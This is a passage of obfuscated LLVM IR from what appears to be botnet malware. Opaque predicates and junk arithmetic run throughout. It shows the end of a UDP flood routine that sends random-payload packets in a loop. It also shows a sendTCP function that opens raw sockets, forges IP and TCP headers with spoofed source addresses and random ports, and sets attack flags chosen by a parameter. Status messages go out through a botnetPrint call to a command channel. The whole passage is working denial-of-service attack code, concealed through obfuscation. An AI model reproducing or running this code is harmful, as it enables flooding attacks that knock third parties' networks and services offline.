  %_14 = shl i32 %566, 1
  %_15 = shl i32 %566, 1
  %567 = add i32 %566, 1
  store i32 %567, i32* %22, align 4
  %568 = load i32, i32* %23, align 4
  %569 = load i32, i32* %15, align 4
  %570 = icmp eq i32 %568, %569
  br label %originalBB10

originalBB19alteredBB:                            ; preds = %originalBB19, %179
  %571 = load i32, i32* %16, align 4
  %_20 = sub i32 0, %571
  %gen21 = add i32 %_20, 1000
  %_22 = shl i32 %571, 1000
  %572 = mul nsw i32 %571, 1000
  %573 = call i32 @usleep(i32 %572)
  store i32 0, i32* %23, align 4
  br label %originalBB19

originalBB26alteredBB:                            ; preds = %originalBB26, %207
  %574 = load i32, i32* @KadenCommStock, align 4
  %575 = call i32 (i32, i8*, ...) @botnetPrint(i32 %574, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.106, i32 0, i32 0))
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %226
  store i32 1, i32* %25, align 4
  %576 = load i32, i32* %24, align 4
  %577 = bitcast i32* %25 to i8*
  %578 = call i32 @setsockopt(i32 %576, i32 0, i32 3, i8* %577, i32 4) #3
  %579 = icmp slt i32 %578, 0
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %247
  %580 = load i32, i32* @KadenCommStock, align 4
  %581 = call i32 (i32, i8*, ...) @botnetPrint(i32 %580, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.107, i32 0, i32 0))
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %281
  store i32 0, i32* %27, align 4
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %298
  %582 = load i32, i32* %12, align 4
  %_43 = shl i32 32, %582
  %_44 = sub i32 32, %582
  %gen45 = mul i32 %_44, %582
  %_46 = shl i32 32, %582
  %_47 = sub i32 0, 32
  %gen48 = add i32 %_47, %582
  %_49 = sub i32 0, 32
  %gen50 = add i32 %_49, %582
  %583 = sub nsw i32 32, %582
  %_51 = shl i32 1, %583
  %_52 = sub i32 1, %583
  %gen53 = mul i32 %_52, %583
  %_54 = sub i32 1, %583
  %gen55 = mul i32 %_54, %583
  %_56 = sub i32 1, %583
  %gen57 = mul i32 %_56, %583
  %_58 = sub i32 0, 1
  %gen59 = add i32 %_58, %583
  %584 = shl i32 1, %583
  %_60 = shl i32 %584, 1
  %_61 = sub i32 0, %584
  %gen62 = add i32 %_61, 1
  %_63 = shl i32 %584, 1
  %_64 = sub i32 0, %584
  %gen65 = add i32 %_64, 1
  %_66 = shl i32 %584, 1
  %_67 = sub i32 0, %584
  %gen68 = add i32 %_67, 1
  %_69 = shl i32 %584, 1
  %_70 = sub i32 0, %584
  %gen71 = add i32 %_70, 1
  %585 = sub nsw i32 %584, 1
  %_72 = shl i32 %585, -1
  %_73 = sub i32 0, %585
  %gen74 = add i32 %_73, -1
  %_75 = shl i32 %585, -1
  %_76 = sub i32 0, %585
  %gen77 = add i32 %_76, -1
  %_78 = shl i32 %585, -1
  %_79 = sub i32 0, %585
  %gen80 = add i32 %_79, -1
  %586 = xor i32 %585, -1
  store i32 %586, i32* %27, align 4
  br label %originalBB42

originalBB84alteredBB:                            ; preds = %originalBB84, %359
  %587 = call i32 @rand_cmwc()
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %382
  %588 = trunc i32 %383 to i16
  %589 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %590 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %589, i32 0, i32 0
  %591 = bitcast %union.anon.1* %590 to %struct.anon.3*
  %592 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %591, i32 0, i32 1
  store i16 %588, i16* %592, align 2
  %593 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %594 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %593, i32 0, i32 0
  %595 = bitcast %union.anon.1* %594 to %struct.anon.3*
  %596 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %595, i32 0, i32 3
  store i16 0, i16* %596, align 2
  %597 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %598 = bitcast %struct.udphdr* %597 to i8*
  %599 = getelementptr inbounds i8, i8* %598, i64 8
  %600 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %599, i32 %600)
  %601 = bitcast i8* %325 to i16*
  %602 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %603 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %602, i32 0, i32 2
  %604 = load i16, i16* %603, align 2
  %605 = zext i16 %604 to i32
  %606 = call zeroext i16 @csum(i16* %601, i32 %605)
  %607 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %608 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %607, i32 0, i32 7
  store i16 %606, i16* %608, align 2
  %609 = call i64 @time(i64* null) #3
  %610 = load i32, i32* %11, align 4
  %611 = sext i32 %610 to i64
  %_89 = sub i64 %609, %611
  %gen90 = mul i64 %_89, %611
  %_91 = sub i64 %609, %611
  %gen92 = mul i64 %_91, %611
  %_93 = sub i64 %609, %611
  %gen94 = mul i64 %_93, %611
  %_95 = shl i64 %609, %611
  %_96 = shl i64 %609, %611
  %_97 = shl i64 %609, %611
  %_98 = shl i64 %609, %611
  %612 = add nsw i64 %609, %611
  %613 = trunc i64 %612 to i32
  store i32 %613, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %originalBB88

originalBB102alteredBB:                           ; preds = %originalBB102, %427
  %614 = load i32, i32* %24, align 4
  %615 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %616 = call i64 @sendto(i32 %614, i8* %325, i64 %323, i32 0, %struct.sockaddr* %615, i32 16)
  %617 = call i32 @rand_cmwc()
  %618 = trunc i32 %617 to i16
  %619 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %620 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %619, i32 0, i32 0
  %621 = bitcast %union.anon.1* %620 to %struct.anon.3*
  %622 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %621, i32 0, i32 0
  store i16 %618, i16* %622, align 2
  %623 = load i32, i32* %10, align 4
  %624 = icmp eq i32 %623, 0
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %455
  %625 = call i32 @rand_cmwc()
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %510
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %528
  %626 = load i32, i32* %32, align 4
  %_115 = shl i32 %626, 1
  %_116 = sub i32 0, %626
  %gen117 = add i32 %_116, 1
  %_118 = sub i32 0, %626
  %gen119 = add i32 %_118, 1
  %_120 = shl i32 %626, 1
  %_121 = sub i32 0, %626
  %gen122 = add i32 %_121, 1
  %627 = add i32 %626, 1
  store i32 %627, i32* %32, align 4
  %628 = load i32, i32* %33, align 4
  %629 = load i32, i32* %15, align 4
  %630 = icmp eq i32 %628, %629
  br label %originalBB114
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

declare i32 @usleep(i32) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = load i32, i32* @x.89
  %9 = load i32, i32* @y.90
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.sockaddr_in, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %16, align 8
  store i32 %1, i32* %17, align 4
  store i32 %2, i32* %18, align 4
  store i32 %3, i32* %19, align 4
  store i8* %4, i8** %20, align 8
  store i32 %5, i32* %21, align 4
  store i32 %6, i32* %22, align 4
  %34 = load i32, i32* %22, align 4
  store i32 %34, i32* %23, align 4
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %35, align 4
  %36 = load i32, i32* %17, align 4
  %37 = icmp eq i32 %36, 0
  %38 = load i32, i32* @x.89
  %39 = load i32, i32* @y.90
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %37, label %46, label %66

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = load i32, i32* @x.89
  %48 = load i32, i32* @y.90
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = call i32 @rand_cmwc()
  %56 = trunc i32 %55 to i16
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %56, i16* %57, align 2
  %58 = load i32, i32* @x.89
  %59 = load i32, i32* @y.90
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %87

; <label>:66:                                     ; preds = %originalBBpart2
  %67 = load i32, i32* @x.89
  %68 = load i32, i32* @y.90
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %66
  %75 = load i32, i32* %17, align 4
  %76 = trunc i32 %75 to i16
  %77 = call zeroext i16 @htons(i16 zeroext %76) #10
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %77, i16* %78, align 2
  %79 = load i32, i32* @x.89
  %80 = load i32, i32* @y.90
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %87

; <label>:87:                                     ; preds = %originalBBpart28, %originalBBpart24
  %88 = load i8*, i8** %16, align 8
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %90 = call i32 @getHost(i8* %88, %struct.in_addr* %89)
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %93

; <label>:92:                                     ; preds = %87
  br label %678

; <label>:93:                                     ; preds = %87
  %94 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 3
  %95 = getelementptr inbounds [8 x i8], [8 x i8]* %94, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %95, i8 0, i64 8, i32 4, i1 false)
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #3
  store i32 %96, i32* %25, align 4
  %97 = load i32, i32* %25, align 4
  %98 = icmp ne i32 %97, 0
  br i1 %98, label %118, label %99

; <label>:99:                                     ; preds = %93
  %100 = load i32, i32* @x.89
  %101 = load i32, i32* @y.90
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %99
  %108 = load i32, i32* @KadenCommStock, align 4
  %109 = call i32 (i32, i8*, ...) @botnetPrint(i32 %108, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.106, i32 0, i32 0))
  %110 = load i32, i32* @x.89
  %111 = load i32, i32* @y.90
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %678

; <label>:118:                                    ; preds = %93
  %119 = load i32, i32* @x.89
  %120 = load i32, i32* @y.90
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %118
  store i32 1, i32* %26, align 4
  %127 = load i32, i32* %25, align 4
  %128 = bitcast i32* %26 to i8*
  %129 = call i32 @setsockopt(i32 %127, i32 0, i32 3, i8* %128, i32 4) #3
  %130 = icmp slt i32 %129, 0
  %131 = load i32, i32* @x.89
  %132 = load i32, i32* @y.90
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %130, label %139, label %158

; <label>:139:                                    ; preds = %originalBBpart216
  %140 = load i32, i32* @x.89
  %141 = load i32, i32* @y.90
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %139
  %148 = load i32, i32* @KadenCommStock, align 4
  %149 = call i32 (i32, i8*, ...) @botnetPrint(i32 %148, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.107, i32 0, i32 0))
  %150 = load i32, i32* @x.89
  %151 = load i32, i32* @y.90
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %678

; <label>:158:                                    ; preds = %originalBBpart216
  %159 = load i32, i32* @x.89
  %160 = load i32, i32* @y.90
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %158
  %167 = load i32, i32* %19, align 4
  %168 = icmp eq i32 %167, 0
  %169 = load i32, i32* @x.89
  %170 = load i32, i32* @y.90
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %168, label %177, label %194

; <label>:177:                                    ; preds = %originalBBpart224
  %178 = load i32, i32* @x.89
  %179 = load i32, i32* @y.90
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %177
  store i32 0, i32* %27, align 4
  %186 = load i32, i32* @x.89
  %187 = load i32, i32* @y.90
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %216

; <label>:194:                                    ; preds = %originalBBpart224
  %195 = load i32, i32* @x.89
  %196 = load i32, i32* @y.90
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %194
  %203 = load i32, i32* %19, align 4
  %204 = sub nsw i32 32, %203
  %205 = shl i32 1, %204
  %206 = sub nsw i32 %205, 1
  %207 = xor i32 %206, -1
  store i32 %207, i32* %27, align 4
  %208 = load i32, i32* @x.89
  %209 = load i32, i32* @y.90
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBBpart257, label %originalBB30alteredBB

originalBBpart257:                                ; preds = %originalBB30
  br label %216

; <label>:216:                                    ; preds = %originalBBpart257, %originalBBpart228
  %217 = load i32, i32* %21, align 4
  %218 = sext i32 %217 to i64
  %219 = add i64 40, %218
  %220 = call i8* @llvm.stacksave()
  store i8* %220, i8** %28, align 8
  %221 = alloca i8, i64 %219, align 16
  %222 = bitcast i8* %221 to %struct.iphdr*
  store %struct.iphdr* %222, %struct.iphdr** %29, align 8
  %223 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %224 = bitcast %struct.iphdr* %223 to i8*
  %225 = getelementptr i8, i8* %224, i64 20
  %226 = bitcast i8* %225 to %struct.tcphdr*
  store %struct.tcphdr* %226, %struct.tcphdr** %30, align 8
  %227 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %228 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %229 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %228, i32 0, i32 0
  %230 = load i32, i32* %229, align 4
  %231 = load i32, i32* %27, align 4
  %232 = call i32 @GRIP(i32 %231)
  %233 = call i32 @htonl(i32 %232) #10
  %234 = load i32, i32* %21, align 4
  %235 = sext i32 %234 to i64
  %236 = add i64 20, %235
  %237 = trunc i64 %236 to i32
  call void @makeIPPacket(%struct.iphdr* %227, i32 %230, i32 %233, i8 zeroext 6, i32 %237)
  %238 = call i32 @rand_cmwc()
  %239 = trunc i32 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon* %241 to %struct.anon.0*
  %243 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %242, i32 0, i32 0
  store i16 %239, i16* %243, align 4
  %244 = call i32 @rand_cmwc()
  %245 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 0
  %247 = bitcast %union.anon* %246 to %struct.anon.0*
  %248 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %247, i32 0, i32 2
  store i32 %244, i32* %248, align 4
  %249 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 0
  %251 = bitcast %union.anon* %250 to %struct.anon.0*
  %252 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %251, i32 0, i32 3
  store i32 0, i32* %252, align 4
  %253 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %254 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %253, i32 0, i32 0
  %255 = bitcast %union.anon* %254 to %struct.anon.0*
  %256 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %255, i32 0, i32 4
  %257 = load i16, i16* %256, align 4
  %258 = and i16 %257, -241
  %259 = or i16 %258, 80
  store i16 %259, i16* %256, align 4
  %260 = load i8*, i8** %20, align 8
  %261 = call i32 @strcmp(i8* %260, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0)) #9
  %262 = icmp ne i32 %261, 0
  br i1 %262, label %299, label %263

; <label>:263:                                    ; preds = %216
  %264 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 0
  %266 = bitcast %union.anon* %265 to %struct.anon.0*
  %267 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %266, i32 0, i32 4
  %268 = load i16, i16* %267, align 4
  %269 = and i16 %268, -513
  %270 = or i16 %269, 512
  store i16 %270, i16* %267, align 4
  %271 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon* %272 to %struct.anon.0*
  %274 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %273, i32 0, i32 4
  %275 = load i16, i16* %274, align 4
  %276 = and i16 %275, -1025
  %277 = or i16 %276, 1024
  store i16 %277, i16* %274, align 4
  %278 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon* %279 to %struct.anon.0*
  %281 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %280, i32 0, i32 4
  %282 = load i16, i16* %281, align 4
  %283 = and i16 %282, -257
  %284 = or i16 %283, 256
  store i16 %284, i16* %281, align 4
  %285 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %286 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %285, i32 0, i32 0
  %287 = bitcast %union.anon* %286 to %struct.anon.0*
  %288 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %287, i32 0, i32 4
  %289 = load i16, i16* %288, align 4
  %290 = and i16 %289, -4097
  %291 = or i16 %290, 4096
  store i16 %291, i16* %288, align 4
  %292 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %293 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %292, i32 0, i32 0
  %294 = bitcast %union.anon* %293 to %struct.anon.0*
  %295 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %294, i32 0, i32 4
  %296 = load i16, i16* %295, align 4
  %297 = and i16 %296, -2049
  %298 = or i16 %297, 2048
  store i16 %298, i16* %295, align 4
  br label %488

; <label>:299:                                    ; preds = %216
  %300 = load i8*, i8** %20, align 8
  %301 = call i8* @strtok(i8* %300, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %301, i8** %31, align 8
  br label %302

; <label>:302:                                    ; preds = %originalBBpart2114, %299
  %303 = load i8*, i8** %31, align 8
  %304 = icmp ne i8* %303, null
  br i1 %304, label %305, label %487

; <label>:305:                                    ; preds = %302
  %306 = load i8*, i8** %31, align 8
  %307 = call i32 @strcmp(i8* %306, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.110, i32 0, i32 0)) #9
  %308 = icmp ne i32 %307, 0
  br i1 %308, label %333, label %309

; <label>:309:                                    ; preds = %305
  %310 = load i32, i32* @x.89
  %311 = load i32, i32* @y.90
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %309
  %318 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon* %319 to %struct.anon.0*
  %321 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %320, i32 0, i32 4
  %322 = load i16, i16* %321, align 4
  %323 = and i16 %322, -513
  %324 = or i16 %323, 512
  store i16 %324, i16* %321, align 4
  %325 = load i32, i32* @x.89
  %326 = load i32, i32* @y.90
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBBpart263, label %originalBB59alteredBB

originalBBpart263:                                ; preds = %originalBB59
  br label %469

; <label>:333:                                    ; preds = %305
  %334 = load i32, i32* @x.89
  %335 = load i32, i32* @y.90
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %333
  %342 = load i8*, i8** %31, align 8
  %343 = call i32 @strcmp(i8* %342, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.111, i32 0, i32 0)) #9
  %344 = icmp ne i32 %343, 0
  %345 = load i32, i32* @x.89
  %346 = load i32, i32* @y.90
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %344, label %361, label %353

; <label>:353:                                    ; preds = %originalBBpart267
  %354 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %355 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %354, i32 0, i32 0
  %356 = bitcast %union.anon* %355 to %struct.anon.0*
  %357 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %356, i32 0, i32 4
  %358 = load i16, i16* %357, align 4
  %359 = and i16 %358, -1025
  %360 = or i16 %359, 1024
  store i16 %360, i16* %357, align 4
  br label %468

; <label>:361:                                    ; preds = %originalBBpart267
  %362 = load i32, i32* @x.89
  %363 = load i32, i32* @y.90
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %361
  %370 = load i8*, i8** %31, align 8
  %371 = call i32 @strcmp(i8* %370, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i32 0, i32 0)) #9
  %372 = icmp ne i32 %371, 0
  %373 = load i32, i32* @x.89
  %374 = load i32, i32* @y.90
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br i1 %372, label %389, label %381

; <label>:381:                                    ; preds = %originalBBpart271
  %382 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 0
  %384 = bitcast %union.anon* %383 to %struct.anon.0*
  %385 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %384, i32 0, i32 4
  %386 = load i16, i16* %385, align 4
  %387 = and i16 %386, -257
  %388 = or i16 %387, 256
  store i16 %388, i16* %385, align 4
  br label %467

; <label>:389:                                    ; preds = %originalBBpart271
  %390 = load i32, i32* @x.89
  %391 = load i32, i32* @y.90
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %389
  %398 = load i8*, i8** %31, align 8
  %399 = call i32 @strcmp(i8* %398, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.113, i32 0, i32 0)) #9
  %400 = icmp ne i32 %399, 0
  %401 = load i32, i32* @x.89
  %402 = load i32, i32* @y.90
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br i1 %400, label %433, label %409

; <label>:409:                                    ; preds = %originalBBpart275
  %410 = load i32, i32* @x.89
